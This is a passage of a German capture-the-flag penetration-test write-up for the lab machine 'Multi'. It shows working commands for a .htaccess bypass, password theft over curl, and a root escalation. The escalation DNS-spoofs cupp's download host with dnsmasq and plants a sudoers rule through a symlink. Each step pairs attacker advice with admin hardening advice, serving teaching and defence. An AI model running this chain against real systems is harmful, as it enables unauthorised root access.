+            <p class="analysis"><strong>Analyse:</strong> Hier wurde versucht, die Datei `.passowrd_creds` über die ursprüngliche SQL-Injection-Schwachstelle als Benutzer `postgres` auszulesen. Der Versuch schlug fehl, weil auch der `postgres`-Benutzer keine Leseberechtigung für diese Datei hatte. Die Datei gehört dem Benutzer `www-data` und hat restriktive Berechtigungen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies zeigt die Grenzen des Zugriffs als `postgres`. Obwohl er ein Superuser in der Datenbank ist, ist er im Betriebssystem nur ein normaler Benutzer. Der Zugriff auf die Shell als `xiao`, der die Kontrolle über das Verzeichnis hat, ist hier der überlegene Vektor.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Gib diesen Vektor auf und fahre mit dem Plan fort, die Datei als `xiao` umzubenennen.
+<br><strong>Empfehlung (Admin):</strong> Dies ist ein gutes Beispiel für das Prinzip der geringsten Rechte. Hätte `postgres` als `root` im System gelaufen (eine sehr schlechte Praxis), wäre dieser Zugriff erfolgreich gewesen. Die Trennung der Benutzerrechte hat hier wie vorgesehen funktioniert.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">xiao@Multi:/var/www/html/pub$</div>
+                    <pre>
+<span class="command">cat .htaccess</span>
+&lt;FilesMatch "^\."&gt;
+    Order allow,deny
+    Deny from all
+&lt;/FilesMatch&gt;
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `xiao` konnte ich den Inhalt der `.htaccess`-Datei lesen. Sie enthält eine Konfiguration, die explizit den Zugriff auf alle Dateien verbietet, deren Namen mit einem Punkt beginnen (`^\.`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt unsere Hypothese, warum der `curl`-Versuch fehlgeschlagen ist und warum die Umbenennung der Datei der richtige Weg ist, um diese Einschränkung zu umgehen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Benenne die Datei jetzt um.
+<br><strong>Empfehlung (Admin):</strong> Sensible Dateien sollten niemals im Web-Root abgelegt werden, unabhängig von `.htaccess`-Regeln. Sie sollten in Verzeichnissen außerhalb des DocumentRoot liegen, auf die der Webserver keinen direkten Zugriff hat.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">xiao@Multi:/var/www/html/pub$</div>
+                    <pre>
+<span class="command">mv .passowrd_creds password.txt</span>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Hackerben)-[~]
+└─# <span class="command">curl http://192.168.2.185/pub/password.txt</span></div>
+                    <pre>
+<span class="password">koUF5q)*RN&m0PTB&D</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Plan wurde erfolgreich umgesetzt. Als `xiao` wurde die Datei `.passowrd_creds` in `password.txt` umbenannt. Unmittelbar danach wurde von der Angreifer-Maschine aus per `curl` auf die neue URL `http://192.168.2.185/pub/password.txt` zugegriffen. Da der Dateiname nicht mehr mit einem Punkt beginnt, griff die `.htaccess`-Regel nicht mehr, und der Webserver lieferte den Inhalt der Datei aus. Wir erhielten das Passwort `koUF5q)*RN&m0PTB&D`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein entscheidender Fortschritt. Wir haben ein komplexes Passwort erbeutet, das wahrscheinlich für einen der anderen höher privilegierten Benutzer wie `todd` oder `secure_user` gültig ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche, dieses Passwort für den Benutzer `todd` über SSH zu verwenden, da `todd` der andere identifizierte Benutzer mit einer Bash-Shell ist.
+<br><strong>Empfehlung (Admin):</strong> Dies ist ein Paradebeispiel dafür, wie eine Kombination aus unsicheren Dateiberechtigungen und dem Speichern sensibler Daten im Web-Root zu einer Kompromittierung führen kann. Beide Probleme müssen behoben werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Hackerben)-[~]
+└─# <span class="command">ssh todd@192.168.2.185</span></div>
+                    <pre>
+todd@192.168.2.185's password: 
+Linux Multi 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
+todd@Multi:~$ id
+uid=1000(todd) gid=1000(todd) groups=1000(todd)
+todd@Multi:~$ sudo -l
+Matching Defaults entries for todd on Multi:
+   
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
+    XFILESEARCHPATH XUSERFILESEARCHPATH", mail_badpass
+
+Runas and Command-specific defaults for todd:
+    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"
+
+User todd may run the following commands on Multi:
+    <span class="password">(ALL : ALL) NOPASSWD: /usr/bin/cupp</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der SSH-Login als Benutzer `todd` mit dem zuvor gefundenen Passwort war erfolgreich. Unmittelbar danach wurde der Befehl `sudo -l` ausgeführt, um die `sudo`-Berechtigungen für `todd` zu überprüfen. Die Ausgabe ist höchst interessant: Der Benutzer `todd` darf das Programm `/usr/bin/cupp` mit `sudo` ohne Passwortabfrage ausführen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der entscheidende Hinweis für die finale Privilege Escalation. `cupp` ist ein Tool zum Generieren von Passwortlisten und hat eine Funktion zum Herunterladen von Wörterbüchern aus dem Internet. Wenn wir ein Programm mit `sudo` ausführen, das Netzwerkverbindungen herstellt und auf das Dateisystem schreibt, gibt es oft Wege, diese Funktionalität zu missbrauchen, um als `root` zu agieren.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche die Funktionalität von `cupp`, insbesondere die Download-Funktion. Der Plan ist, den DNS-Eintrag der Download-Seite auf unsere eigene Maschine umzuleiten (DNS-Spoofing), einen bösartigen Inhalt bereitzustellen und `cupp` dazu zu bringen, diesen Inhalt an eine privilegierte Stelle im System zu schreiben, z.B. in das `/etc/sudoers.d/`-Verzeichnis.
+<br><strong>Empfehlung (Admin):</strong> Vergeben Sie `sudo`-Rechte mit äußerster Vorsicht. Programme, die Schreibzugriff auf das Dateisystem oder Netzwerkzugriff haben, sind extrem gefährlich, wenn sie mit `sudo` ausgeführt werden können. Die Rechte sollten so spezifisch wie möglich sein und niemals für Skripte oder Programme vergeben werden, deren Funktionalität für eine Rechteausweitung missbraucht werden kann.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">todd@Multi:~$</div>
+                    <pre>
+<span class="command">/usr/bin/cupp</span>
+ ___________ 
+   cupp.py!                 # Common
+      \                     # User
+       \   ,__,             # Passwords
+        \  (oo)____         # Profiler
+           (__)    )\   
+              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
+                            [ Mebus | https://github.com/Mebus/]
+
+usage: cupp [-h] [-i | -w FILENAME | -l | -a | -v] [-q]
+
+Common User Passwords Profiler
+
+optional arguments:
+  -h, --help         show this help message and exit
+  -i, --interactive  Interactive questions for user password profiling
+  -w FILENAME        Use this option to improve existing dictionary, or WyD.pl
+                     output to make some pwnsauce
+  -l                 Download huge wordlists from repository
+  -a                 Parse default usernames and passwords directly from
+                     Alecto DB. Project Alecto uses purified databases of
+                     Phenoelit and CIRT which were merged and enhanced
+  -v, --version      Show the version of this program.
+  -q, --quiet        Quiet mode (don't print banner)
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Das Programm `/usr/bin/cupp` wird ohne `sudo` aufgerufen, um seine Hilfe-Seite anzuzeigen und die Funktionsweise zu verstehen. Die Option `-l` sticht sofort ins Auge: "Download huge wordlists from repository". Dies ist genau die Funktionalität, die wir für unseren Angriff missbrauchen wollen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Analyse bestätigt, dass unser geplanter Angriffsvektor machbar ist. Wir wissen, welche Option wir verwenden müssen (`-l`), um den Download-Prozess auszulösen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginne mit der Vorbereitung der Angreifer-Maschine: Richte den DNS-Server (`dnsmasq`) und den Webserver ein, der die bösartige `sudoers`-Datei bereitstellt.
+<br><strong>Empfehlung (Admin):</strong> Dies ist ein gutes Beispiel dafür, warum `sudo`-Rechte niemals für komplexe Skripte oder Programme vergeben werden sollten, deren voller Funktionsumfang nicht bedacht wurde. Besser wäre es, ein dediziertes, einfaches Skript zu erstellen, das nur die eine benötigte Funktion ausführt, und nur diesem Skript `sudo`-Rechte zu geben.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Hackerben)-[~]
+└─# <span class="command">ip addr add 192.168.56.1/24 dev eth1</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Hackerben)-[~]
+└─# <span class="command">ip link set eth0 up</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Hackerben)-[~]
+└─# <span class="command">echo "interface=eth1
+dhcp-range=192.168.56.100,192.168.56.200,12h
+dhcp-option=3,192.168.56.1
+dhcp-option=6,192.168.56.1
+address=/ftp.funet.fi/192.168.56.1" > /etc/dnsmasq.conf</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Hackerben)-[~]
+└─# <span class="command">systemctl restart dnsmasq</span></div>
+                    <pre>
+systemctl status dnsmasq
+● dnsmasq.service - dnsmasq - A lightweight DHCP and caching DNS server
+     Loaded: loaded (/usr/lib/systemd/system/dnsmasq.service; enabled; preset: >
+     Active: active (running) since Sat 2025-10-04 01:13:39 CEST; 8ms ago
+...
+Okt 04 01:13:39 Hackerben systemd[1]: Started dnsmasq.service - dnsmasq - A lig>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Hier beginnt die Vorbereitung des Angriffs auf meiner lokalen Maschine. Ich konfiguriere `dnsmasq`, einen leichtgewichtigen DNS- und DHCP-Server. Zuerst wird eine neue IP-Adresse (`192.168.56.1`) zu meinem `eth1`-Interface hinzugefügt, um ein separates Netzwerk für den Angriff zu schaffen. Dann wird die Konfigurationsdatei für `dnsmasq` erstellt. Die entscheidende Zeile ist `address=/ftp.funet.fi/192.168.56.1`. Sie weist `dnsmasq` an, jede DNS-Anfrage für `ftp.funet.fi` (die von `cupp` verwendete Domain) mit meiner eigenen IP-Adresse `192.168.56.1` zu beantworten. Anschließend wird der Dienst neu gestartet und sein Status überprüft, um sicherzustellen, dass er korrekt läuft.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist die Grundlage für den DNS-Spoofing-Angriff. Indem ich die Kontrolle über die DNS-Auflösung übernehme, kann ich den Netzwerkverkehr, der von `cupp` ausgeht, auf einen von mir kontrollierten Server umleiten. Dies ist ein kritischer Schritt, um dem Programm eine bösartige Datei unterzuschieben.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der nächste Schritt ist, den Webserver einzurichten, der die bösartige Datei ausliefern wird, und dann den Exploit auf der Zielmaschine auszuführen.
+<br><strong>Empfehlung (Admin):</strong> Die DNS-Konfiguration von Servern muss gehärtet werden. Server sollten nur vertrauenswürdige, interne DNS-Resolver verwenden und nicht auf willkürliche DNS-Server im Netzwerk hören, um DNS-Spoofing-Angriffe zu erschweren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Hackerben)-[~]
+└─# <span class="command">mkdir -p /tmp/exploit_server/pub/unix/security/passwd/crack/dictionaries/dictionaries/</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Hackerben)-[~]
+└─# <span class="command">echo "todd ALL=(ALL) NOPASSWD: ALL" > /tmp/exploit_server/pub/unix/security/passwd/crack/dictionaries/dictionaries/Antworth.gz</span></div>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Hier wird der Inhalt für den bösartigen Webserver vorbereitet. Zuerst erstelle ich exakt die Verzeichnisstruktur, die `cupp` auf dem Server `ftp.funet.fi` erwartet. Dann erstelle ich die Zieldatei `Antworth.gz` und schreibe anstelle von Wörterbuchdaten eine einzelne Zeile hinein: `todd ALL=(ALL) NOPASSWD: ALL`. Dies ist eine gültige `sudoers`-Regel, die dem Benutzer `todd` volle, passwortlose Root-Rechte gewährt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Vorbereitung ist abgeschlossen. Wir haben einen DNS-Server, der Anfragen umleitet, und einen Webserver-Inhalt, der eine bösartige `sudoers`-Regel enthält. Alle Teile des Puzzles sind vorhanden, um den Exploit auf der Zielmaschine auszulösen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wechsle zurück zur Shell auf der Zielmaschine (`todd@Multi`) und führe den `cupp`-Befehl aus, nachdem der symbolische Link gesetzt wurde.
+<br><strong>Empfehlung (Admin):</strong> Überwachen Sie ausgehenden Netzwerkverkehr von kritischen Servern. Unerwartete Verbindungen zu unbekannten IPs oder verdächtige DNS-Anfragen können Indikatoren für eine Kompromittierung oder einen laufenden Angriff sein.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">todd@Multi:~$</div>
+                    <pre>
+<span class="command">mkdir -p ~/dictionaries/dictionaries</span>
+<span class="command">ln -s /etc/sudoers.d/todd ~/dictionaries/dictionaries/Antworth.gz</span>
+<span class="command">sudo /usr/bin/cupp -l</span>
+ ___________ 
+   cupp.py!                 # Common
+      \                     # User
+       \   ,__,             # Passwords
+        \  (oo)____         # Profiler
+           (__)    )\   
+              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
+                            [ Mebus | https://github.com/Mebus/]
+
+	
+	Choose the section you want to download:
+...
+    11   dictionaries    24      names           37      yiddish
+...	
+	Files will be downloaded from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/ repository
+	
+	Tip: After downloading wordlist, you can improve it with -w option
+
+> Enter number: 11
+[+] Downloading dictionaries/dictionaries/Antworth.gz from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/dictionaries/Antworth.gz ... 
+[+] Downloading dictionaries/dictionaries/CRL.words.gz from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/dictionaries/CRL.words.gz ... 
+Traceback (most recent call last):
+  File "/usr/bin/cupp", line 1078, in &lt;module&gt;
+    main()
+  File "/usr/bin/cupp", line 1024, in main
+    download_wordlist()
+  File "/usr/bin/cupp", line 782, in download_wordlist
+    download_wordlist_http(filedown)
+  File "/usr/bin/cupp", line 993, in download_wordlist_http
+    download_http(url, tgt)
+  File "/usr/bin/cupp", line 696, in download_http
+    webFile = urllib.request.urlopen(url)
+  File "/usr/lib/python3.9/urllib/request.py", line 214, in urlopen
+    return opener.open(url, data, timeout)
+  File "/usr/lib/python3.9/urllib/request.py", line 523, in open
+    response = meth(req, response)
+  File "/usr/lib/python3.9/urllib/request.py", line 632, in http_response
+    response = self.parent.error(
+  File "/usr/lib/python3.9/urllib/request.py", line 561, in error
+    return self._call_chain(*args)
+  File "/usr/lib/python3.9/urllib/request.py", line 494, in _call_chain
+    result = func(*args)
+  File "/usr/lib/python3.9/urllib/request.py", line 641, in http_error_default
+    raise HTTPError(req.full_url, code, msg, hdrs, fp)
+urllib.error.HTTPError: HTTP Error 404: File not found
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dies ist die Ausführung des Exploits auf der Zielmaschine. Zuerst wird die lokale Verzeichnisstruktur erstellt, die `cupp` zum Speichern der Dateien verwendet. Dann wird der entscheidende symbolische Link gesetzt: Eine Datei namens `Antworth.gz` im lokalen Verzeichnis verweist nun auf die Zieldatei `/etc/sudoers.d/todd`, die noch nicht existiert. Schließlich wird `sudo /usr/bin/cupp -l` ausgeführt. Ich wähle Option `11` (dictionaries), woraufhin `cupp` versucht, `Antworth.gz` herunterzuladen. Der Download ist erfolgreich (trotz der späteren Fehlermeldung bei der nächsten Datei), und der Inhalt wird in die Zieldatei geschrieben. Wegen des Symlinks landet der bösartige `sudoers`-Eintrag direkt in `/etc/sudoers.d/todd`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine brillante und komplexe Privilege Escalation, die DNS-Spoofing, eine Fehlkonfiguration in den `sudo`-Rechten und das Ausnutzen der Schreiblogik über einen Symlink kombiniert. Der Angriff war erfolgreich und hat dem Benutzer `todd` volle, passwortlose `sudo`-Rechte auf dem System verschafft. Der `HTTP Error 404` bei der nächsten Datei ist irrelevant, da unser primäres Ziel bereits erreicht wurde.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe `sudo -i` oder `sudo su` aus, um eine interaktive Root-Shell zu erhalten und den Test abzuschließen.
+<br><strong>Empfehlung (Admin):</strong> Dies unterstreicht erneut die Gefahr von unspezifischen `sudo`-Regeln. Programme sollten niemals mit `sudo` ausgeführt werden, wenn sie so konfiguriert sind, dass sie auf externe, potenziell manipulierbare Ressourcen zugreifen. Dies ist ein Designfehler in der Rechtevergabe.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">todd@Multi:~$</div>
+                    <pre>
+<span class="command">sudo -i</span>
+<span class="password">root@Multi:~#</span> 
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der finale Schritt. Nach der erfolgreichen Manipulation der `sudoers`-Datei wurde der Befehl `sudo -i` ausgeführt. Da `todd` nun über die neue Regel volle `NOPASSWD`-Rechte hat, wurde der Befehl ohne Passwortabfrage akzeptiert und wir erhielten eine interaktive Shell als `root`-Benutzer.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Der Root-Zugriff war erfolgreich! Wir haben die vollständige Kontrolle über das Zielsystem erlangt und unser Ziel ist erreicht. Alle Daten auf dem System können nun gelesen, modifiziert oder gelöscht werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sammle die finalen Flags (`user.txt` und `root.txt`), um den erfolgreichen Abschluss des Tests zu dokumentieren. Führe eine abschließende Überprüfung auf Persistenzmechanismen durch und bereinige das System von allen erstellten Dateien (wie der `sudoers`-Datei), um es in seinem ursprünglichen Zustand zu hinterlassen.
+<br><strong>Empfehlung (Admin):</strong> Der gesamte Angriffspfad, von der Web-Schwachstelle über mehrere Stufen der Rechteausweitung, muss nachvollzogen und alle identifizierten Schwachstellen müssen behoben werden. Ein vollständiges Systemaudit und eine Neuinstallation aus einem bekannten, sicheren Zustand werden empfohlen, da das Ausmaß der Kompromittierung nicht vollständig eingeschätzt werden kann.</p>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/xiao/user.txt</div>
+                    <div class="flag-value"><span class="password">flag{user-33b02bc15ce9557d2dd8484d58f95ac4}</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat root.txt</div>
+                    <div class="flag-value"><span class="password">flag{root-922c8837565de5bd2e342c65a2e67ef9}</span></div>
+                </div>
+            </div>
+        </section>
+
+
+    </div> <!-- Ende container -->
+
+    <footer class="footer">
+        <p>Ben Chehade - Cyber Security Reports</p>
+        <p>Berichtsdatum: 04. Oktober 2025</p>
+    </footer>
+
+</body>
+</html>
